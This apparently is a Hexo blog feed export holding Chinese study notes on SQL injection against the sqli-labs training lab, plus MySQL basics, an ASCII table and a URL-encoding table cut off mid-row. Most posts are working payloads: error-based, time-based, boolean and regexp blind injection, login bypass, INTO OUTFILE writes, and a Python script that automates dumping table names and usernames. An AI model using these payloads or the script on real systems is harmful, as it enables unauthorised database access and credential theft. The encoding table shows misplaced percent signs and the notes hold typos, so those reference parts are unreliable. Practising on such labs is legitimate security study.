if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></pre><p>②benchmark()</p><pre><code>?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+</code></pre><p>select group_concat(username,0x3a,password) from users</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL:增删改查</title>
      <link href="2020/12/08/mysql-zeng-shan-gai-cha/"/>
      <url>2020/12/08/mysql-zeng-shan-gai-cha/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQL查询语句："><a href="#MySQL查询语句：" class="headerlink" title="MySQL查询语句："></a>MySQL查询语句：</h3><p>　<strong>(1）增加</strong></p><p>insert into table_name (column1, column2, column3, …) values (value1, value2, value3, …);<br>insert into table_name values (value1, value2, value3, …);　</p><p><strong>（2）删除</strong></p><p>删除数据：</p><ul><li>delete from 表名; </li><li>delete from 表名 where id=1; </li></ul><p>删除结构： </p><ul><li>删数据库：drop database 数据库名; </li><li>删除表：drop table 表名; </li><li>删除表中的列：alter table 表名 drop column 列名; </li></ul><p><strong>（3）修改</strong></p><p>修改所有：update 表名 set 列名=’新的值，非数字加单引号’ ; </p><p>带条件的修改：update 表名 set 列名=’新的值，非数字加单引号’ where id=6; </p><p>简单举例：update users set username=’tt’ where id=16;</p><p>查库：</p><pre><code>select schema_name from information_schema.schemata;</code></pre><p>　　查表：</p><pre><code>select table_name from information_schema.tables where table_schema='security';</code></pre><p>（以security表为例）</p><p>　　查列：</p><pre><code>select column_name from information_schema.columns where table_name='users';</code></pre><p>　　查字段：</p><pre><code>select username,password from security.users;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-13-14</title>
      <link href="2020/12/08/sql-sqlilabs-less-13-14/"/>
      <url>2020/12/08/sql-sqlilabs-less-13-14/</url>
      
        <content type="html"><![CDATA[<p>在username处輸入</p><pre><code>admin'</code></pre><p>password隨便輸入，这里輸入“1”</p><p>得到報錯：</p><pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1') LIMIT 0,1' at line 1</code></pre><p>可見，程序对id進行了’)處理，通過構造：</p><pre><code>admin') or 1=1 #</code></pre><p>登陸成功後本關不回顯成功信息</p><h3 id="採用以下注入方法："><a href="#採用以下注入方法：" class="headerlink" title="採用以下注入方法："></a>採用以下注入方法：</h3><h4 id="報錯注入："><a href="#報錯注入：" class="headerlink" title="報錯注入："></a>報錯注入：</h4><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue:"></a>extractvalue:</h5><pre><code>admin') and extractvalue(1,concat(0x23,(select username from users limit 0,1)))-- </code></pre><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml:"></a>updatexml:</h5><pre><code>admin') and updatexml(1,concat(0x23,(select username from users limit 0,1)),1)-- </code></pre><h5 id="double溢出："><a href="#double溢出：" class="headerlink" title="double溢出："></a>double溢出：</h5><pre><code>admin') union select (exp(~(select * from (select username from users limit 0,1))),2-- </code></pre><h4 id="延時注入："><a href="#延時注入：" class="headerlink" title="延時注入："></a>延時注入：</h4><pre><code>admin') and if(substr(database(),1,1)='s',1,sleep(5))-- </code></pre><h4 id="布爾注入："><a href="#布爾注入：" class="headerlink" title="布爾注入："></a>布爾注入：</h4><p>暫時沒有成功過先跳過這個方法</p><h4 id="二次查詢注入："><a href="#二次查詢注入：" class="headerlink" title="二次查詢注入："></a>二次查詢注入：</h4><pre><code>admin') union select 1,2 from (select count(*),concat((select concat(username,0x3a, password) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a #</code></pre><h4 id="所以在十四關使用這樣的語句："><a href="#所以在十四關使用這樣的語句：" class="headerlink" title="所以在十四關使用這樣的語句："></a>所以在十四關使用這樣的語句：</h4><pre><code>admin" and extractvalue(1,concat(0x23,(select username from users limit 0,1)))-- </code></pre><pre><code>admin" and updatexml(1,concat(0x23,(select username from users limit 0,1)),1)-- </code></pre><pre><code>admin" union select (exp(~(select * from (select username from users limit 0,1))),2-- </code></pre><pre><code>admin" and if(substr(database(),1,1)='s',1,sleep(5))-- </code></pre><pre><code>admin" union select 1,2 from (select count(*),concat((select concat(username,0x3a,password) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a #</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-7:文件导入注入</title>
      <link href="2020/12/07/sql-sqlilabs-less-7-wen-jian-dao-ru-zhu-ru/"/>
      <url>2020/12/07/sql-sqlilabs-less-7-wen-jian-dao-ru-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>可以直接将查询语句的结果写入文件中，然后访问此文件即可。</p><p>注意这里的文件不能是一个已经存在的文件</p><h4 id="写入用户，库名，版本号："><a href="#写入用户，库名，版本号：" class="headerlink" title="写入用户，库名，版本号："></a>写入用户，库名，版本号：</h4><pre><code>?id=-1')) union select user(),database(),version() into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\1.txt" --+ </code></pre><h4 id="写入表名："><a href="#写入表名：" class="headerlink" title="写入表名："></a>写入表名：</h4><pre><code>?id=-1')) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\2.txt"--+</code></pre><h4 id="写入列名："><a href="#写入列名：" class="headerlink" title="写入列名："></a>写入列名：</h4><pre><code>?id=-1')) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\3.txt" --+ </code></pre><h4 id="写入字段："><a href="#写入字段：" class="headerlink" title="写入字段："></a>写入字段：</h4><pre><code>?id=-1'))  union select 1,2,group_concat(username,0x3a,password) from users into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\4.txt" --+ </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-5-6:盲注</title>
      <link href="2020/12/05/sql-sqlilabs-less-5-6-mang-zhu/"/>
      <url>2020/12/05/sql-sqlilabs-less-5-6-mang-zhu/</url>
      
        <content type="html"><![CDATA[<p>推荐使用报错注入</p><h2 id="布尔-Boolean-注入："><a href="#布尔-Boolean-注入：" class="headerlink" title="布尔(Boolean)注入："></a>布尔(Boolean)注入：</h2><h4 id="判断数据库长度："><a href="#判断数据库长度：" class="headerlink" title="判断数据库长度："></a>判断数据库长度：</h4><pre><code>?id=1' and length(database())&gt;0--+</code></pre><p>?id=1’ and length(database())=8–+ 得到“you’re in…”的结果，分析数据库有八位；</p><h4 id="确定数据库名称组成："><a href="#确定数据库名称组成：" class="headerlink" title="确定数据库名称组成："></a>确定数据库名称组成：</h4><pre><code>?id=1' and ascii(substr(database(),1,1)=83)--+</code></pre><p>这里的s的ASCII码为83，以此类推，一一比较；</p><h4 id="判断表的个数："><a href="#判断表的个数：" class="headerlink" title="判断表的个数："></a>判断表的个数：</h4><pre><code>?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;0--+</code></pre><h4 id="判断表的长度："><a href="#判断表的长度：" class="headerlink" title="判断表的长度："></a>判断表的长度：</h4><pre><code>?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;0--+</code></pre><h4 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h4><pre><code>?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;79--+</code></pre><h4 id="确定列数："><a href="#确定列数：" class="headerlink" title="确定列数："></a>确定列数：</h4><pre><code>and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')&gt;0--+</code></pre><h4 id="确定列长度："><a href="#确定列长度：" class="headerlink" title="确定列长度："></a>确定列长度：</h4><pre><code>and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1)) &gt; 0--+</code></pre><h4 id="爆列名："><a href="#爆列名：" class="headerlink" title="爆列名："></a>爆列名：</h4><pre><code>and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1),1,1)) &gt; 79</code></pre><h4 id="爆数据："><a href="#爆数据：" class="headerlink" title="爆数据："></a>爆数据：</h4><pre><code>and ascii(substr((select username from users limit 0,1),1,1))&gt;67</code></pre><pre><code>and ascii(substr((select password from users limit 0,1),1,1))&gt;67</code></pre><p>以此类推，得出剩余数据。</p><h2 id="正则注入："><a href="#正则注入：" class="headerlink" title="正则注入："></a>正则注入：</h2><p>前同布尔注入；</p><h4 id="关于正则注入的解释："><a href="#关于正则注入的解释：" class="headerlink" title="关于正则注入的解释："></a>关于正则注入的解释：</h4><p>（\1. 判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名。</p><p>注：正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z范围内</p><pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1) /*</code></pre><p>\2. 判断第一个字符是否是a-n中的字符</p><pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)/*</code></pre><p>\3. 确定该字符为n</p><pre><code>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1) /*</code></pre><p>\4. 表达式的更换如下</p><p>expression like this: ‘^n[a-z]’ -&gt; ‘^ne[a-z]’ -&gt; ‘^new[a-z]’ -&gt; ‘^news[a-z]’ -&gt; FALSE</p><p>这时说明表名为news ，要验证是否是该表明 正则表达式为’^news’，但是没这必要 直接判断 table_name = ’news‘ 不就行了。</p><p>\5.regexp匹配的时候会在所有的项都进行匹配。例如:</p><pre><code>security数据库的表有多个，users，email等select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^u[a-z]' limit 0,1);是正确的select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);是正确的select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^em[a-z]' limit 0,1);是正确的select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 1,1);不正确select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^em[a-z]' limit 1,1);不正确</code></pre><p>实验表明：在limit 0,1下，regexp会匹配所有的项。我们在使用regexp时，要注意有可能有多个项，同时要一个个字符去爆破。类似于上述第一条和第二条。而此时limit 0,1此时是对于where table_schema=’security’ limit 0,1。table_schema=’security’已经起到了限定作用了，limit有没有已经不重要了。）</p><h4 id="爆表名：-1"><a href="#爆表名：-1" class="headerlink" title="爆表名："></a>爆表名：</h4><pre><code>id=1' and 1=(select 1 from information_schema.columnswhere table_name='users' and column_name regexp '^us[a-z]' limit 0,1) --+</code></pre><h4 id="判断表中的第一列是否含有username："><a href="#判断表中的第一列是否含有username：" class="headerlink" title="判断表中的第一列是否含有username："></a>判断表中的第一列是否含有username：</h4><pre><code>id=1' and 1=(select 1 from information_schema.columnswhere table_name='users' and column_name regexp '^username' limit 0,1) --+</code></pre><h4 id="猜测users表的内容："><a href="#猜测users表的内容：" class="headerlink" title="猜测users表的内容："></a>猜测users表的内容：</h4><pre><code>id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--</code></pre><h2 id="二次查询注入："><a href="#二次查询注入：" class="headerlink" title="二次查询注入："></a>二次查询注入：</h2><p>二次查询注入是两个select语句的嵌套，嵌套的语句称为子查询语句</p><h4 id="爆数据库名："><a href="#爆数据库名：" class="headerlink" title="爆数据库名："></a>爆数据库名：</h4><pre><code>?id=1' union SELECT null,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>第二次查询数据库是报错“duplicate entry ‘security1’ for key ‘group_key’</p><p>这里的“security”就是我们想获得的数据库名称</p><h4 id="爆表名：-2"><a href="#爆表名：-2" class="headerlink" title="爆表名："></a>爆表名：</h4><pre><code>?id=1' union SELECT null,count(*),concat((select table_name from information_schema.tables where table_schema='security'limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>这里的limit x,1是为了让数据更好的爆出，以此类推第四张表为：</p><pre><code>?id=1' union SELECT null,count(*),concat((select table_name from information_schema.tables where table_schema='security'limit 3,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>得到“users”的表名称；</p><h4 id="爆列名：-1"><a href="#爆列名：-1" class="headerlink" title="爆列名："></a>爆列名：</h4><p>列一：</p><pre><code>?id=1' union SELECT null,count(*),concat((select column_name from information_schema.columns where table_name='users'limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>列二：</p><pre><code>?id=1' union SELECT null,count(*),concat((select column_name from information_schema.columns where table_name='users'limit 1,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>得到“username”和“password”两个列名；</p><h4 id="爆字段："><a href="#爆字段：" class="headerlink" title="爆字段："></a>爆字段：</h4><pre><code>?id=1' union SELECT null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><pre><code>?id=1' union SELECT null,count(*),concat((select password from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><h5 id="一个exp脚本："><a href="#一个exp脚本：" class="headerlink" title="一个exp脚本："></a>一个exp脚本：</h5><pre><code>import requestsfrom bs4 import BeautifulSoupdb_name = ''table_list = []column_list = []url = '''http://192.168.1.113:86/Less-5/?id=1'''### 获取当前数据库名 ###print('当前数据库名:')payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''r = requests.get(url+payload)db_name = r.text.split(':')[-2]print('[+]' + db_name)### 获取表名 ###print('数据库%s下的表名:' % db_name)for i in range(50):    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)    r = requests.get(url+payload)    if 'group_key' not in r.text:        break    table_name = r.text.split(':')[-2]    table_list.append(table_name)    print('[+]' + table_name)### 获取列名 ####### 这里以users表为例 ####print('%s表下的列名:' % table_list[-1])for i in range(50):    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)    r = requests.get(url + payload)    if 'group_key' not in r.text:        break    column_name = r.text.split(':')[-2]    column_list.append(column_name)    print('[+]' + column_name)### 获取字段值 ####### 这里以username列为例 ####print('%s列下的字段值:' % column_list[-2])for i in range(50):    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)    r = requests.get(url + payload)    if 'group_key' not in r.text:        break    dump = r.text.split(':')[-2]    print('[+]' + dump)</code></pre><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="利用xpath函数报错注入"><a href="#利用xpath函数报错注入" class="headerlink" title="利用xpath函数报错注入:"></a>利用xpath函数报错注入:</h3><h4 id="爆数据库名：-1"><a href="#爆数据库名：-1" class="headerlink" title="爆数据库名："></a>爆数据库名：</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,database(),0x23))%23</code></pre><p>注：这里的0x23可以更改为非“/”的符号，第二个“0x23”也可以省略；</p><p>得到报错：</p><pre><code>XPATH syntax error:'#security#'</code></pre><p>则”security“为我们想要查询的数据库名。</p><h4 id="爆表名：-3"><a href="#爆表名：-3" class="headerlink" title="爆表名："></a>爆表名：</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x23))--+</code></pre><h4 id="爆列名：-2"><a href="#爆列名：-2" class="headerlink" title="爆列名："></a>爆列名：</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),0x23))--+</code></pre><h4 id="爆字段：-1"><a href="#爆字段：-1" class="headerlink" title="爆字段："></a>爆字段：</h4><pre><code>?id=1' and extractvalue(1,concat(0x23,(select username from users limit 1,1),0x23))--+</code></pre><pre><code>?id=1' and extractvalue(1,concat(0x23,(select password from users limit 1,1),0x23))--+</code></pre><p>这边是看到有个说法说“爆密码时密码不全，要用截取函数截取剩下的密码”</p><pre><code>and extractvalue(1,concat(0x23,substr(（select password from users limit 0,1）,32,1),0x23))</code></pre><p>暂时没有遇到“爆密码时密码不全”的情况，理解了以后再来补充</p><p>以此类推，得出剩余数据。</p><h3 id="利用double数值类型超出范围进行报错注入："><a href="#利用double数值类型超出范围进行报错注入：" class="headerlink" title="利用double数值类型超出范围进行报错注入："></a>利用double数值类型超出范围进行报错注入：</h3><pre><code>?id=1' union select (exp(~(select * from (select user())a))),2,3--+</code></pre><p>得到报错：</p><pre><code>DOUBLE value is out of range in'exp(~((select 'root@localhost'from dual)))'</code></pre><h3 id="利用bigint溢出进行报错注入"><a href="#利用bigint溢出进行报错注入" class="headerlink" title="利用bigint溢出进行报错注入:"></a>利用bigint溢出进行报错注入:</h3><pre><code>?id=1' union select (!(select * from (select user())x) - ~0),2,3--+</code></pre><p>得到报错：</p><pre><code>BRIGHT UNSIGNLD value is out of range in '((not((select 'root@localhost'from dual)))-~(0))'</code></pre><h3 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性:"></a>利用数据的重复性:</h3><pre><code>?id=1' union select 1,2,3 from (select name_const(version(),1),name_const(version(),1))x --+</code></pre><p>得到报错：</p><pre><code>duplicate column name~~~~</code></pre><h2 id="延时注入："><a href="#延时注入：" class="headerlink" title="延时注入："></a>延时注入：</h2><h4 id="sleep-函数延时注入："><a href="#sleep-函数延时注入：" class="headerlink" title="sleep()函数延时注入："></a>sleep()函数延时注入：</h4><pre><code>?id=1'and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></pre><p>当错误的时候会有5秒的时间延时。</p><h4 id="benchmark函数延时注入："><a href="#benchmark函数延时注入：" class="headerlink" title="benchmark函数延时注入："></a>benchmark函数延时注入：</h4><pre><code>?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+</code></pre><p>当结果正确的时候，运行ENCODE(‘MSG’,’by 5 seconds’)操作50000000次，会占用一段时间。</p><h2 id="可以使用group-concat-一次查询所有表名"><a href="#可以使用group-concat-一次查询所有表名" class="headerlink" title="可以使用group_concat 一次查询所有表名"></a>可以使用group_concat 一次查询所有表名</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:基于extractvalue()和updatexml()的报错注入</title>
      <link href="2020/12/02/sql-ji-yu-extractvalue-he-updatexml-de-bao-cuo-zhu-ru/"/>
      <url>2020/12/02/sql-ji-yu-extractvalue-he-updatexml-de-bao-cuo-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>extractvalue() :对XML文档进行查询的函数</p><p>其实就是相当于我们熟悉的HTML文件中用 </p><div><p><a>标签查找元素一样</a></p><p>语法：extractvalue(目标xml文档，xml路径)</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><p>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p><pre><code>select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))</code></pre><p>使用concat()拼接 ‘ / ‘ 效果相同，</p><pre><code>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘/’,(select database()))))</code></pre><p>这里在’anything’中查询不到 位置是 /database()的内容，</p><p>但也没有语法错误，不会报错，下面故意写入语法错误：</p><pre><code>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</code></pre><p>报错：</p><pre><code>#1105-XAPTH syntax error:'~security'</code></pre><p>可以看出，以~开头的内容不是xml格式的语法，报错，但是会显示无法识别的内容是什么，这样就达到了目的。</p><p>有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</p><p>这里查询前5位示意:</p><pre><code>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))</code></pre><p>报错：</p><pre><code>#1105—XPATH syntax error:'#73656'</code></pre><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。</p><p>语法updatexml(目标xml文档，xml路径，更新的内容)</p><pre><code>select username from security.user where id=1 and (updatexml(‘anything’,’/xx/xx’,’anything’))</code></pre><p>报错方式相同：</p><pre><code>select username from security.user where id=1 and (updatexml(‘anything’,concat(‘~’,(select database())),’anything’))</code></pre><p>报错：</p><pre><code>#1105-XPATH syntax error:'~security'</code></pre><p>同样是32位查询</p></div><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ASCII码表</title>
      <link href="2020/12/02/ascii-ma-biao/"/>
      <url>2020/12/02/ascii-ma-biao/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="left">ASCII值</th><th align="left">控制字符</th><th align="left">ASCII值</th><th align="left">控制字符</th><th align="left">ASCII值</th><th align="left">控制字符</th><th align="left">ASCII值</th><th align="left">控制字符</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">NUT</td><td align="left">32</td><td align="left">(space)</td><td align="left">64</td><td align="left">@</td><td align="left">96</td><td align="left">、</td></tr><tr><td align="left">1</td><td align="left">SOH</td><td align="left">33</td><td align="left">!</td><td align="left">65</td><td align="left">A</td><td align="left">97</td><td align="left">a</td></tr><tr><td align="left">2</td><td align="left">STX</td><td align="left">34</td><td align="left">“</td><td align="left">66</td><td align="left">B</td><td align="left">98</td><td align="left">b</td></tr><tr><td align="left">3</td><td align="left">ETX</td><td align="left">35</td><td align="left">#</td><td align="left">67</td><td align="left">C</td><td align="left">99</td><td align="left">c</td></tr><tr><td align="left">4</td><td align="left">EOT</td><td align="left">36</td><td align="left">$</td><td align="left">68</td><td align="left">D</td><td align="left">100</td><td align="left">d</td></tr><tr><td align="left">5</td><td align="left">ENQ</td><td align="left">37</td><td align="left">%</td><td align="left">69</td><td align="left">E</td><td align="left">101</td><td align="left">e</td></tr><tr><td align="left">6</td><td align="left">ACK</td><td align="left">38</td><td align="left">&amp;</td><td align="left">70</td><td align="left">F</td><td align="left">102</td><td align="left">f</td></tr><tr><td align="left">7</td><td align="left">BEL</td><td align="left">39</td><td align="left">,</td><td align="left">71</td><td align="left">G</td><td align="left">103</td><td align="left">g</td></tr><tr><td align="left">8</td><td align="left">BS</td><td align="left">40</td><td align="left">(</td><td align="left">72</td><td align="left">H</td><td align="left">104</td><td align="left">h</td></tr><tr><td align="left">9</td><td align="left">HT</td><td align="left">41</td><td align="left">)</td><td align="left">73</td><td align="left">I</td><td align="left">105</td><td align="left">i</td></tr><tr><td align="left">10</td><td align="left">LF</td><td align="left">42</td><td align="left">*</td><td align="left">74</td><td align="left">J</td><td align="left">106</td><td align="left">j</td></tr><tr><td align="left">11</td><td align="left">VT</td><td align="left">43</td><td align="left">+</td><td align="left">75</td><td align="left">K</td><td align="left">107</td><td align="left">k</td></tr><tr><td align="left">12</td><td align="left">FF</td><td align="left">44</td><td align="left">,</td><td align="left">76</td><td align="left">L</td><td align="left">108</td><td align="left">l</td></tr><tr><td align="left">13</td><td align="left">CR</td><td align="left">45</td><td align="left">-</td><td align="left">77</td><td align="left">M</td><td align="left">109</td><td align="left">m</td></tr><tr><td align="left">14</td><td align="left">SO</td><td align="left">46</td><td align="left">.</td><td align="left">78</td><td align="left">N</td><td align="left">110</td><td align="left">n</td></tr><tr><td align="left">15</td><td align="left">SI</td><td align="left">47</td><td align="left">/</td><td align="left">79</td><td align="left">O</td><td align="left">111</td><td align="left">o</td></tr><tr><td align="left">16</td><td align="left">DLE</td><td align="left">48</td><td align="left">0</td><td align="left">80</td><td align="left">P</td><td align="left">112</td><td align="left">p</td></tr><tr><td align="left">17</td><td align="left">DCI</td><td align="left">49</td><td align="left">1</td><td align="left">81</td><td align="left">Q</td><td align="left">113</td><td align="left">q</td></tr><tr><td align="left">18</td><td align="left">DC2</td><td align="left">50</td><td align="left">2</td><td align="left">82</td><td align="left">R</td><td align="left">114</td><td align="left">r</td></tr><tr><td align="left">19</td><td align="left">DC3</td><td align="left">51</td><td align="left">3</td><td align="left">83</td><td align="left">S</td><td align="left">115</td><td align="left">s</td></tr><tr><td align="left">20</td><td align="left">DC4</td><td align="left">52</td><td align="left">4</td><td align="left">84</td><td align="left">T</td><td align="left">116</td><td align="left">t</td></tr><tr><td align="left">21</td><td align="left">NAK</td><td align="left">53</td><td align="left">5</td><td align="left">85</td><td align="left">U</td><td align="left">117</td><td align="left">u</td></tr><tr><td align="left">22</td><td align="left">SYN</td><td align="left">54</td><td align="left">6</td><td align="left">86</td><td align="left">V</td><td align="left">118</td><td align="left">v</td></tr><tr><td align="left">23</td><td align="left">TB</td><td align="left">55</td><td align="left">7</td><td align="left">87</td><td align="left">W</td><td align="left">119</td><td align="left">w</td></tr><tr><td align="left">24</td><td align="left">CAN</td><td align="left">56</td><td align="left">8</td><td align="left">88</td><td align="left">X</td><td align="left">120</td><td align="left">x</td></tr><tr><td align="left">25</td><td align="left">EM</td><td align="left">57</td><td align="left">9</td><td align="left">89</td><td align="left">Y</td><td align="left">121</td><td align="left">y</td></tr><tr><td align="left">26</td><td align="left">SUB</td><td align="left">58</td><td align="left">:</td><td align="left">90</td><td align="left">Z</td><td align="left">122</td><td align="left">z</td></tr><tr><td align="left">27</td><td align="left">ESC</td><td align="left">59</td><td align="left">;</td><td align="left">91</td><td align="left">[</td><td align="left">123</td><td align="left">{</td></tr><tr><td align="left">28</td><td align="left">FS</td><td align="left">60</td><td align="left">&lt;</td><td align="left">92</td><td align="left">/</td><td align="left">124</td><td align="left">|</td></tr><tr><td align="left">29</td><td align="left">GS</td><td align="left">61</td><td align="left">=</td><td align="left">93</td><td align="left">]</td><td align="left">125</td><td align="left">}</td></tr><tr><td align="left">30</td><td align="left">RS</td><td align="left">62</td><td align="left">&gt;</td><td align="left">94</td><td align="left">^</td><td align="left">126</td><td align="left">`</td></tr><tr><td align="left">31</td><td align="left">US</td><td align="left">63</td><td align="left">?</td><td align="left">95</td><td align="left">_</td><td align="left">127</td><td align="left">DEL</td></tr></tbody></table><h3 id="特殊字符查询"><a href="#特殊字符查询" class="headerlink" title="特殊字符查询"></a>特殊字符查询</h3><table><thead><tr><th>NUL空</th><th>VT 垂直制表</th><th>SYN 空转同步</th></tr></thead><tbody><tr><td>STX 正文开始</td><td>CR 回车</td><td>CAN 作废</td></tr><tr><td>ETX 正文结束</td><td>SO 移位输出</td><td>EM 纸尽</td></tr><tr><td>EOY 传输结束</td><td>SI 移位输入</td><td>SUB 换置</td></tr><tr><td>ENQ 询问字符</td><td>DLE 空格</td><td>ESC 换码</td></tr><tr><td>ACK 承认</td><td>DC1 设备控制1</td><td>FS 文字分隔符</td></tr><tr><td>BEL 报警</td><td>DC2 设备控制2</td><td>GS 组分隔符</td></tr><tr><td>BS 退一格</td><td>DC3 设备控制3</td><td>RS 记录分隔符</td></tr><tr><td>HT 横向列表</td><td>DC4 设备控制4</td><td>US 单元分隔符</td></tr><tr><td>LF 换行</td><td>NAK 否定</td><td>DEL 删除</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>URL：编码表</title>
      <link href="2020/12/02/url-bian-ma-biao/"/>
      <url>2020/12/02/url-bian-ma-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="URL编码表"><a href="#URL编码表" class="headerlink" title="URL编码表"></a>URL编码表</h2><table><thead><tr><th>backspace</th><th>8%</th><th>A</th><th>41%</th><th>a</th><th>61%</th><th>§</th><th>%A7</th><th>Õ</th><th>%D5</th><th></th></tr></thead><tbody><tr><td>tab</td><td>9%</td><td>B</td><td>42%</td><td>b</td><td>62%</td><td>«</td><td>%AB</td><td>Ö</td><td>%D6</td><td></td></tr><tr><td>linefeed</td><td>%0A</td><td>C</td><td>43%</td><td>c</td><td>63%</td><td>¬</td><td>%AC</td><td>Ø</td><td>%D8</td><td></td></tr><tr><td>creturn</td><td>%0D</td><td>D</td><td>44%</td><td>d</td><td>64%</td><td>¯</td><td>%AD</td><td>Ù</td><td>%D9</td><td></td></tr><tr><td>space</td><td>20%</td><td>E</td><td>45%</td><td>e</td><td>65%</td><td>º</td><td>%B0</td><td>Ú</td><td>%DA</td><td></td></tr><tr><td>!</td><td>21%</td><td>F</td><td>46%</td><td>f</td><td>66%</td><td>±</td><td>%B1</td><td>Û</td><td>%DB</td><td></td></tr><tr><td>“</td><td>22%</td><td>G</td><td>47%</td><td>g</td><td>67%</td><td>ª</td><td>%B2</td><td>Ü</td><td>%DC</td><td></td></tr><tr><td>#</td><td>23%</td><td>H</td><td>48%</td><t